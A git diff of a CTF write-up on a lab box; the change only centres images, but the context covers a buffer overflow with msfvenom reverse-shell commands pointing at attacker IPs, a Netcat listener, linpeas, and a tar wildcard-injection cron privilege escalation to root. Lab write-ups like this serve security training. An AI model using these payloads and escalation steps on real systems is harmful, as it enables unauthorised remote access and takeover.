@@ -220,21 +220,29 @@ This step in the process will allow us to find the characters that the binary re
 
 Now that the program is attached and running, let’s take a look at our bad character hunting script. Shown below is the script that we will use for this part of the process.
 
+<p align="center">
 <a href="/images/bad_py.png"><img src="/images/bad_py.png"></a>
+ </p>
 
 This script will connect to the target IP and port, send 142 “A’s” followed with 4 “B’s” followed up by all 255 ASCII characters with a return and newline added. In order to execute the script, we will use the following command:
 ```console
 python bad_char_.py
 ```
+<p align="center">
 <a href="/images/bad_char.png"><img src="/images/bad_char.png"></a>
+ </p>
 
 As we expected, the program crashed and Immunity caught the exception.
 
+<p align="center">
 <a href="/images/imdb_5.png"><img src="/images/imdb_5.png"></a>
+ </p>
 
 In order to search for bad characters, we will need to **Right-Click ESP --> Follow in Dump**. This will bring up the hex dump shown in the screenshot below.
 
+<p align="center">
 <a href="/images/hex_dump.png"><img src="/images/hex_dump.png"></a>
+ </p>
 
 In terms of exploit development, it can be assumed that **\x00** is always going to be a bad character because it maps to nothing or NULL. We can see in the screenshot above that there is one lone bad character (outside **\x00**) and that is **\x0a**. The characters that this program rejects are **\x00\x0a**. We will use these values as our bad characters moving forward with the process. The next step is to find the return address.
 
@@ -270,11 +278,15 @@ We will now use MSFVenom to generate custom shell code to plug into our proof of
 ```console
  msfvenom -p windows/shell_reverse_tcp LHOST=192.168.110.130 LPORT=2222 EXITFUNC=thread -f c -a x86 -b "\x00\x0a"
  ```
+ <p align="center">
  <a href="/images/msfvenom_local.png"><img src="/images/msfvenom_local.png"></a>
+ </p>
 
 We will use this shell code to achieve a reverse TCP connection (reverse shell) from the remote host. The script we will use to accomplish this can be seen in the screenshot below.
 
+<p align="center">
  <a href="/images/local_exploit_py.png"><img src="/images/local_exploit_py.png"></a>
+ </p>
 
 Now that we have our proof-of-concept script all configured, it's time to pop a shell! We will first set up a Netcat listener using the following command:
 ```console
@@ -284,11 +296,15 @@ We will then use the following command to execute the exploitation script:
 ```console
 python exploit.py
 ```
+<p align="center">
  <a href="/images/local_exploit.png"><img src="/images/local_exploit.png"></a>
+ </p>
 
 As we expected, we received a reverse TCP connection from our local Windows system! This will allow us to remotely execute commands on the target.
 
+<p align="center">
  <a href="/images/local_shell.png"><img src="/images/local_shell.png"></a>
+ </p>
 
 To provide some further proof of concept, we will execute the following commands on our local Windows system through our reverse TCP connection:
 ```console
@@ -297,32 +313,44 @@ whoami
 ```console
 ipconfig
 ```
+<p align="center">
  <a href="/images/local_proof.png"><img src="/images/local_proof.png"></a>
+ </p>
 
 Now that we have proven that our proof-of-concept script works, we can make some changes that will allow us to establish a foothold on the target system.
 
 ### **Exploitation**
 There are a few things that we need to do before we can pop a shell on the target system. The first thing that is important to remember is that we are targeting a Linux system. Referring back to our Nmap scan, we can see that the service version for SSH belongs to Ubuntu Linux. Now, how is it possible for a Linux system to execute a Windows executable? Well, let’s find out!
 
+<p align="center">
  <a href="/images/nmap_2.png"><img src="/images/nmap_2.png"></a>
+ </p>
 
 To get things started, we first need to generate shellcode using the appropriate payload for the type of system we are targeting. In this case, we will need to use a payload that targets 32-bit Linux systems. The command we will use to generate the shell code is as follows:
 ```console
 msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.6.95.238 LPORT=2222 EXITFUNC=thread -f c -a x86 -b "\x00\x0a"
 ```
+<p align="center">
  <a href="/images/msfvenom_remote.png"><img src="/images/msfvenom_remote.png"></a>
+ </p>
 
 We will simply replace our shellcode in our exploitation script as well as change the target IP address. The changes that were made to the script can be seen in the screenshot below.
 
+<p align="center">
  <a href="/images/remote_exploit_py.png"><img src="/images/remote_exploit_py.png"></a>
+ </p>
 
 Now that the script has been modified, we can send our payload to the target system using the following command:
 
+<p align="center">
  <a href="/images/remote_exploit.png"><img src="/images/remote_exploit.png"></a>
+ </p>
 
 As expected, we received a reverse TCP connection from the target host!
 
+<p align="center">
  <a href="/images/remote_shell.png"><img src="/images/remote_shell.png"></a>
+ </p>
 
 ### **Post-Exploitation**
 The first thing we will do to our newly established shell is make it a fully interactive TTY session. This will give us the look and feel of a normal terminal session. We will accomplish this by entering the series of following commands:
@@ -338,14 +366,18 @@ export TERM=xterm
 ```console
 stty raw -echo; fg (ENTER x2)
 ```
+<p align="center">
  <a href="/images/shell_upgrade.png"><img src="/images/shell_upgrade.png"></a>
+ </p>
 
 #### **user.txt**
 Now that we have a low-level shell, we can grab the **user.txt** flag. For this challenge, the shell lands in the user’s home directory. We will execute the following command to get the flag:
 ```console
 cat user.txt
 ```
+<p align="center">
  <a href="/images/user_txt.png"><img src="/images/user_txt.png"></a>
+ </p>
 
 ### **Privilege Escalation**
 The main goal of this challenge is to achieve a root shell and access the **root.txt** flag. To do this, we need to perform privilege escalation to escalate from our current low-level shell to root. We will use **linpeas.sh** to help speed up the process of discovering the privilege escalation vector. First, we need to upload **linpeas.sh** to the target system, make it executable, and then run it. We will accomplish this task using the following commands:
@@ -358,31 +390,43 @@ chmod +x linpeas.sh
 ```console
 ./linpeas.sh
 ```
+<p align="center">
  <a href="/images/upload_linpeas.png"><img src="/images/upload_linpeas.png"></a>
+ </p>
 
 There are some interesting cron jobs that are being run on this system. The first cron job uses Wine to execute **beskarNights.exe** every two minutes. This would explain why there is a Windows binary running on a Linux system! The next cron job is named **5minutes**; this stands out as abnormal. We will investigate this further.
 
+<p align="center">
  <a href="/images/cron_job.png"><img src="/images/cron_job.png"></a>
+ </p>
 
 We are especially interested in the **5minutes** cron job because it is being run by root. Let’s take a closer look at what it does by running the following command:
 ```console
 cat /etc/cron.d/5minutes
 ```
+<p align="center">
  <a href="/images/cron_contents.png"><img src="/images/cron_contents.png"></a>
+ </p>
 
 As we can see in the screenshot above, the cron job changes into the **/var/www/html** directory and uses tar to compress all of its contents and send them to **/tmp/beskarNights.tar.gz**. Notice how this cron job uses a wildcard character to grab all of the contents within the **/var/www/html** directory. Let’s see how we can abuse this to achieve a root shell. First, we need to do a little research to figure out how to leverage this misconfiguration to achieve privilege escalation. There is a good proof of concept on [Hacking Articles](https://www.hackingarticles.in/linux-privilege-escalation-by-exploiting-cron-jobs/) for this exact scenario.
 
+<p align="center">
  <a href="/images/hacking_articles.png"><img src="/images/hacking_articles.png"></a>
+ </p>
 
 As we can see in the screenshot above, we can create a script in the directory that the cron job is being executed on and add a couple extra commands that will cause the script to be executed when the job is run. For our case, we will make some minor changes to this process. We will first generate a Python3 reverse shell using [Reverse Shell Generator](https://www.revshells.com/).
 
+<p align="center">
  <a href="/images/rev_shell_gen.png"><img src="/images/rev_shell_gen.png"></a>
+ </p>
 
 After the reverse shell is generated, we will create a file called **test.sh** in the **/var/www/html** directory using the following command:
 ```console
 vim test.sh
 ```
+<p align="center">
  <a href="/images/rev_shell.png"><img src="/images/rev_shell.png"></a>
+ </p>
 
 After creating test.sh, we will execute the following commands to ensure that our reverse shell script is executed when the job is run:
 ```console
@@ -394,11 +438,15 @@ echo "" > --checkpoint=1
 ```console
 chmod 777 test.sh
 ```
+<p align="center">
  <a href="/images/wildcard_injection.png"><img src="/images/wildcard_injection.png"></a>
+ </p>
 
 As we can see in the screenshot above, everything we need to perform the privilege escalation is in place. Now, all we need is for the cron job to run. Referring back to the cron job output, the job is scheduled to run every 5 minutes. After a short wait, we receive a root shell!
 
+<p align="center">
  <a href="/images/root_shell.png"><img src="/images/root_shell.png"></a>
+ </p>
 
 #### **root.txt**
 The final goal of many CTF challenges is to achieve a root shell and grab the root.txt flag. We will accomplish this by entering the following commands:
@@ -411,4 +459,6 @@ cat /root/root.txt
 ```console
 ifconfig
 ```
+<p align="center">
  <a href="/images/proof_txt.png"><img src="/images/proof_txt.png"></a>
+ </p>
